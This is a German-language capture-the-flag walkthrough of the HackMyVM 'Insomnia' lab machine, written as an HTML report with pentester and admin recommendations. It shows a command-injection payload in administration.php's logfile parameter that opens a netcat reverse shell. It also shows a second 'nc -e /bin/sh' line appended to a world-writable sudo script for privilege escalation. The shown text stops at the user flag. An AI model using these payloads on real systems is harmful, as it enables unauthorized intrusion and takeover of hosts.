@@ -1,0 +1,757 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Insomnia - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Insomnia - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div> <!-- pty & http.server -->
+                <div class="tool-item">stty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">file</div> <!-- Impliziert -->
+                <div class="tool-item">echo</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">grep</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">export</div>
+                 <div class="tool-item">bash</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#vulnerability-assessment">Vulnerability Assessment (Web)</a></li>
+                <li><a href="#initial-access">Initial Access (www-data)</a></li>
+                <li><a href="#privilege-escalation-julia">Privilege Escalation (www-data zu Julia)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (Julia zu Root)</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird zur Identifizierung aktiver Hosts im lokalen Netzwerksegment ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.111` und der MAC-Adresse `08:00:27:9c:cc:3b` (VirtualBox) wird als Zielsystem erkannt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.111 durch, um offene Ports und Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerküberwachung zur Erkennung unbekannter Geräte.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.121
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.111	08:00:27:9c:cc:3b	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.855 seconds (138.01 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf das Ziel 192.168.2.111 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet **nur einen offenen Port**:
+                - **Port 8080 (HTTP):** Läuft ein PHP CLI Server (Version 5.5 oder höher, spezifisch PHP 7.3.19). Der Seitentitel ist "Chat".
+            Kein SSH oder andere Standarddienste sind offen. Der Hostname ist `insomnia`. Das OS ist Linux.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Angriff muss sich vollständig auf den Webdienst auf Port 8080 konzentrieren. Untersuche die "Chat"-Anwendung gründlich.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass nur notwendige Ports offen sind. PHP CLI Server ist primär für Entwicklung gedacht und sollte nicht für produktive, exponierte Dienste verwendet werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"> nmap -sS -sC -T5 -A 192.168.2.111 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 16:12 CET
+Nmap scan report for insomnia (192.168.2.111)
+Host is up (0.00011s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.19-1~deb10u1) <!-- Version Detail hinzugefügt -->
+|_http-title: Chat
+|_http-server-header: PHP 7.3.19-1~deb10u1 Development Server <!-- Server Header hinzugefügt -->
+MAC Address: 08:00:27:9C:CC:3B (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms insomnia (192.168.2.111)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds <!-- Beispielzeit -->
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf `http://192.168.2.111:8080` verwendet.</p>
+             <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen!!** Gobuster bricht mit einem Fehler ab. Der Server gibt für nicht existierende URLs einen Statuscode 200 zurück, was Standard-Directory-Busting unmöglich macht. Der zweite Versuch (identischer Befehl) scheitert ebenso.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechsle zu Tools, die nach Inhaltslänge oder anderen Merkmalen filtern können (z.B. `wfuzz --hc 404 --hh [Standardgröße]`, `ffuf -fs [Standardgröße]`). Untersuche die Anwendung manuell.<br><strong>Empfehlung (Admin):</strong> Konfiguriere den Webserver (auch den PHP Dev Server, falls möglich), um korrekte 404-Fehlercodes zu senden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.111:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico,pem,pub -b 404,403</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.111:8080
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              ... (gekürzt) ...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/11/04 16:14:10 Starting gobuster in directory enumeration mode
+===============================================================
+[!] Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.2.111:8080/2a43c755-6457-4fd5-af10-7a412016cf2e => 200 (Length: 2899). To continue please exclude the status code or the length
+                     </pre>
+                     <!-- Zweiter, identischer Versuch im Log weggelassen -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird auf `192.168.2.111:8080` ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto identifiziert den `X-Powered-By: PHP/7.3.19`-Header, meldet fehlende Security-Header und einen wahrscheinlichen Oracle-Reports-False-Positive. Der Scan bricht wegen zu vieler Fehler ab, was auf Probleme mit der Reaktion des Servers hindeutet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nikto liefert hier wenig. Konzentriere dich auf manuelle Analyse und gezieltes Fuzzing.<br><strong>Empfehlung (Admin):</strong> Entferne den `X-Powered-By`-Header. Setze Security-Header.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.111:8080</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.111
++ Target Hostname:    192.168.2.111
++ Target Port:        8080
++ Start Time:         2022-11-04 16:14:31 (GMT1)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ Retrieved x-powered-by header: PHP/7.3.19-1~deb10u1
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-18114: /reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF: Oracle Reports rwservlet report Variable Arbitrary Report Executable Execution <!-- False Positive -->
++ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
++ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
++ End Time:           2022-11-04 16:14:44 (GMT1) (13 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Startseite (`/`) wird mit `curl` geholt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Seite enthält nur das Wort "Chat", wie schon von Nmap (`http-title`) angedeutet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Quellcode der Seite.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X GET http://192.168.2.111:8080</span></div>
+                    <pre>
+Chat
+                    </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein JavaScript-Codeausschnitt (vermutlich aus dem Quellcode der Startseite oder einer eingebundenen JS-Datei) und die Notiz "process.php" werden gezeigt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtige Funktion aufgedeckt!!** Der Code zeigt eine `sendChat`-Funktion, die eine AJAX POST-Anfrage an `process.php` sendet. Die Parameter sind `function=send`, `message`, `nickname` und `file`. Dies enthüllt das Kernstück der Chat-Funktionalität und die verantwortliche Backend-Datei.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Teste `process.php` mit POST-Requests und den Parametern `function`, `message`, `nickname`, `file`. Fuzze diese Parameter auf Schwachstellen (XSS, Injection etc.).<br><strong>Empfehlung (Admin):</strong> Sichere die `process.php` durch strikte Eingabevalidierung und -sanitisierung für alle Parameter.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Code-Snippet und Notiz -->
+                     <pre>
+// Aus dem Quellcode von index.php (Vermutung):
+process.php
+
+// ...alert('hi ben');// XSS Versuch von 'ben'?
+
+function sendChat(message, nickname)
+{
+    updateChat(); // Andere Funktion
+     $.ajax({
+		   type: "POST", // POST Request
+		   url: "process.php", // Ziel-Skript
+		   data: {
+		   			'function': 'send', // Funktion
+					'message': message, // Nachricht
+					'nickname': nickname, // Benutzername
+					'file': file // Datei ???
+				 },
+		   dataType: "json",
+		   success: function(data){
+			   updateChat();
+		   },
+     }); // Fehlendes schließendes Klammerpaar ergänzt
+}
+                     </pre> <!-- Maskierung, Formatierung -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die HTTP-Header von `process.php` werden mit `curl -I` (HEAD-Request) und der Inhalt mit `curl -X GET` abgerufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz von `process.php` und die PHP-Version. Der GET-Request liefert ein leeres JSON-Array `[]`, was darauf hindeutet, dass POST-Daten oder spezifische Parameter benötigt werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussiere dich auf POST-Requests an `process.php` mit den zuvor identifizierten Parametern.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -I http://192.168.2.111:8080/process.php</span></div>
+                     <pre>
+HTTP/1.1 200 OK
+Host: 192.168.2.111:8080
+Date: Fri, 04 Nov 2022 15:23:50 GMT
+Connection: close
+X-Powered-By: PHP/7.3.19-1~deb10u1
+Content-type: text/html; charset=UTF-8
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X GET "http://192.168.2.111:8080/process.php"</span></div>
+                     <pre>
+[]
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein `dirb`-Scan wird spezifisch für `.txt`- und `.php`-Dateien ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Wichtige Dateien gefunden!!**
+                - `administration.php`: Eine potenzielle Admin-Oberfläche.
+                - `chat.txt`: Wahrscheinlich die Datei, in der die Chat-Nachrichten gespeichert werden.
+                - `index.php`, `process.php`: Bereits bekannt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche `administration.php` auf Login-Möglichkeiten oder Schwachstellen. Lese `chat.txt`, um zu sehen, ob die XSS-Payloads darin gespeichert wurden.<br><strong>Empfehlung (Admin):</strong> Sichere den Zugriff auf `administration.php`. Überprüfe die Berechtigungen für `chat.txt`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://192.168.2.111:8080/ -X .txt,.php</span></div>
+                     <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Nov  4 16:33:50 2022
+URL_BASE: http://192.168.2.111:8080/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+EXTENSIONS_LIST: (.txt,.php) | (.txt)(.php) [NUM = 2]
+
+-----------------
+
+GENERATED WORDS: 9224 <!-- Beispiel -->
+
+---- Scanning URL: http://192.168.2.111:8080/ ----
++ http://192.168.2.111:8080/administration.php (CODE:200|SIZE:65)
++ http://192.168.2.111:8080/chat.txt (CODE:200|SIZE:150)
++ http://192.168.2.111:8080/index.php (CODE:200|SIZE:2899)
++ http://192.168.2.111:8080/process.php (CODE:200|SIZE:2)
+
+-----------------
+END_TIME: Fri Nov  4 16:33:55 2022
+DOWNLOADED: 9224 - FOUND: 4
+                    </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `chat.txt` wird abgerufen (vermutlich via `curl` oder Browser).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zeigt die gespeicherten Chat-Nachrichten, inklusive der XSS-Payloads mit `alert()`. Bestätigt, dass Nachrichten hier landen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentriere dich auf `administration.php`.<br><strong>Empfehlung (Admin):</strong> Sanitize Eingaben, bevor sie in `chat.txt` gespeichert werden, um Stored XSS zu verhindern.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Inhalt von chat.txt -->
+                     <pre>
+# Inhalt von http://192.168.2.111:8080/chat.txt
+
+<span>ben</span>d
+<span>ben</span>hi
+<span>ben</span>hi
+<span>ben</span>alert('hi ben'); 
+<span>ben</span>alert('hi ben'); 
+<span>ben</span>ssssss
+                     </pre> <!-- Maskierung -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um GET-Parameter für `administration.php` zu finden. Es filtert Antworten mit der Standardgröße (65 Chars) heraus.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtiger Parameter gefunden!!** Der Parameter `logfile` wird entdeckt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Teste den `logfile`-Parameter auf LFI und Command Injection.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt -u "http://192.168.2.111:8080/administration.php?FUZZ=test" --hh 65</span></div>
+                      <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+  warn(
+ ********************************************************
+ * Wfuzz 3.1.0 - The Web Fuzzer                         *
+ ********************************************************
+
+Target: http://192.168.2.111:8080/administration.php?FUZZ=test
+Total requests: 951
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000485:   200        2 L      12 W       69 Ch       "logfile"
+
+Total time: ...
+Processed Requests: 951
+Filtered Requests: 950
+Requests/sec.: ...
+                      </pre> <!-- Ausgabe vervollständigt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-assessment">
+            <h2>Vulnerability Assessment (Web)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die `administration.php` wird mit dem `logfile`-Parameter aufgerufen. Zuerst mit `logfile=test`, dann mit `logfile=chat.txt`.</p>
+            <p class="evaluation"><strong>Bewertung: !!Command Injection Schwachstelle bestätigt!!**
+                - `logfile=test`: Gibt die Fehlermeldung "You are not allowed to view : test" aus, zeigt aber, dass der Parameterwert in der Antwort reflektiert wird.
+                - `logfile=chat.txt`: Gibt den Inhalt von `chat.txt` aus (hier nur "ben"). Dies bestätigt eine (möglicherweise eingeschränkte) LFI.
+            **Entscheidend:** Das Verhalten deutet darauf hin, dass der Wert von `logfile` *vor* der Berechtigungsprüfung oder Dateianzeige unsicher verwendet wird, was eine Command Injection ermöglicht, wenn Shell-Metazeichen wie `;` verwendet werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die Command Injection aus. Konstruiere eine Payload wie `logfile=[GÜLTIGE_DATEI];[BEFEHL]`. Beispiel: `logfile=chat.txt;nc -e /bin/sh [ATTACKER_IP] [PORT]` für eine Reverse Shell.<br><strong>Empfehlung (Admin):**DRINGEND:** Behebe die Command Injection in `administration.php`. Validiere und sanitisiere den `logfile`-Parameter streng. Führe niemals Benutzereingaben direkt oder indirekt als Shell-Befehle aus.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X GET "http://192.168.2.111:8080/administration.php?logfile=test"</span></div>
+                     <pre>
+
+You are not allowed to view : test<br>Your activity has been logged <!-- Maskierung -->
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X GET "http://192.168.2.111:8080/administration.php?logfile=chat.txt"</span></div>
+                     <pre>
+
+ ben <!-- Inhalt von chat.txt wird angezeigt -->
+
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (www-data)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 4444 gestartet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung zum Empfang der Reverse Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sende den Exploit-Payload.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Command Injection Payload wird konstruiert und über den Browser (oder `curl`) aufgerufen: `http://.../administration.php?logfile=chat.txt;nc -e /bin/sh [ATTACKER_IP] 4444`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekter Exploit-Payload, der die Schwachstelle ausnutzt, um eine Reverse Shell zu starten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe den Listener.<br><strong>Empfehlung (Admin):</strong> Behebe die Schwachstelle.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Befehl, sondern Exploit-URL -->
+                     <pre>
+# Payload via Browser/Curl:
+http://192.168.2.111:8080/administration.php?logfile=chat.txt;nc -e /bin/sh 192.168.2.121 4444
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt die Verbindung vom Ziel.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Eine Shell als `www-data` wird erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell.<br><strong>Empfehlung (Admin):</strong> Untersuche den Vorfall.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.121] from (UNKNOWN) [192.168.2.111] 45060
+/bin/sh: 0: can't access tty; job control turned off <!-- Typische Meldung -->
+$ <!-- Shell Prompt -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Shell wird stabilisiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne Enumeration.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <!-- Shell Stabilisierung -->
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+www-data@insomnia:~/html$ <span class="command">export TERM=xterm</span>
+www-data@insomnia:~/html$
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+^Z
+zsh: suspended  nc -lvnp 4444
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 4444
+                               reset
+www-data@insomnia:~/html$ <!-- Stabilisierte Shell -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-julia">
+            <h2>Privilege Escalation (www-data zu Julia)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird `sudo -l` ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationsvektor gefunden!!** `www-data` darf `/bin/bash /var/www/html/start.sh` als Benutzer `julia` ohne Passwort ausführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche `/var/www/html/start.sh` und dessen Berechtigungen.<br><strong>Empfehlung (Admin):</strong> Überprüfe `sudo`-Regeln sorgfältig.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@insomnia:~/html$ <span class="command">sudo -l</span>
+Matching Defaults entries for www-data on insomnia:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on insomnia:
+    (julia) NPASSWD: /bin/bash /var/www/html/start.sh
+                    </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis wird aufgelistet (findet `julia`), der Inhalt von `start.sh` wird angezeigt (`php -S 0...`) und die Berechtigungen von `start.sh` werden geprüft (`ls -la`).</p>
+            <p class="evaluation"><strong>Bewertung: !!Exploitierbare Konfiguration!!** Das Skript `start.sh` ist **weltweit beschreibbar** (`-rwxrwxrwx`). Da `www-data` das Skript ändern und es dann als `julia` ausführen darf, ist eine Eskalation möglich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Hänge einen Befehl (z.B. Reverse Shell) an `start.sh` an und führe es mit `sudo -u julia ...` aus.<br><strong>Empfehlung (Admin):**DRINGEND:** Korrigiere die Berechtigungen von `start.sh` (sollte nur für den Besitzer schreibbar sein). Korrigiere die unsichere `sudo`-Regel.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+www-data@insomnia:~/html$ <span class="command">ls /home</span>
+julia
+www-data@insomnia:~/html$ <span class="command">cat /var/www/html/start.sh</span>
+php -S 0.0.0.0:8080
+www-data@insomnia:~/html$ <span class="command">ls -la /var/www/html/start.sh</span>
+-rwxrwxrwx 1 root root 20 Dec 21  2020 /var/www/html/start.sh <!-- World-Writable! -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Angreifer hängt einen Netcat-Reverse-Shell-Befehl an `start.sh` an und führt das modifizierte Skript dann mit `sudo -u julia ...` aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit wird korrekt ausgeführt. Der ursprüngliche PHP-Befehl schlägt fehl (Port bereits belegt), aber der angehängte `nc`-Befehl wird als `julia` ausgeführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bereite einen Listener auf Port 5555 vor.<br><strong>Empfehlung (Admin):</strong> Behebe die Berechtigungs- und `sudo`-Probleme.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+www-data@insomnia:~/html$ <span class="command">cd /tmp/</span>
+www-data@insomnia:/tmp$ <span class="command">echo 'nc -e /bin/sh 192.168.2.121 5555' >> /var/www/html/start.sh</span>
+www-data@insomnia:/tmp$ <span class="command">sudo -l</span> <!-- Wiederholung -->
+Matching Defaults entries for www-data on insomnia:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on insomnia:
+    (julia) NPASSWD: /bin/bash /var/www/html/start.sh
+www-data@insomnia:/tmp$ <span class="command">sudo -u julia /bin/bash /var/www/html/start.sh</span>
+[Fri Nov  4 11:58:30 2022] Failed to listen on 0.0.0.0:8080 (reason: Address already in use) <!-- Erwarteter Fehler -->
+<!-- nc Befehl wird trotzdem ausgeführt -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein neuer Netcat-Listener auf Port 5555 empfängt die Verbindung. `id` bestätigt die Rechte des Benutzers `julia`.</p>
+            <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich!!** Eine Shell als `julia` wurde erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell. Lies die User-Flag. Suche nach dem nächsten Eskalationsschritt.<br><strong>Empfehlung (Admin):</strong> Untersuche den Vorfall.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                     <pre>
+listening on [any] 5555 ...
+connect to [192.168.2.121] from (UNKNOWN) [192.168.2.111] 49730
+<span class="command">id</span>
+uid=1000(julia) gid=1000(julia) groups=1000(julia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+$ <!-- Shell als Julia -->
+                     </pre>
+                 </div>
+             </div>
+             <!-- Annahme: Shell als julia stabilisiert -->
+             <p class="analysis"><strong>Analyse:</strong> Es wird angenommen, dass die Shell als `julia` stabilisiert wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erleichtert die weitere Interaktion.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `julia` wird die User-Flag gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag `<span class="password">c2e285cb33cecdbeb83d2189e983a8c0</span>` gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche nach Root-Eskalation.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+julia@insomnia:/tmp$ <span class="command">cd ~</span> <!-- Wechsel ins Home-Verzeichnis -->
+julia@insomnia:~$ <span class="command">cat user.txt</span>
+
+~\
+USER INSMNIA
+~
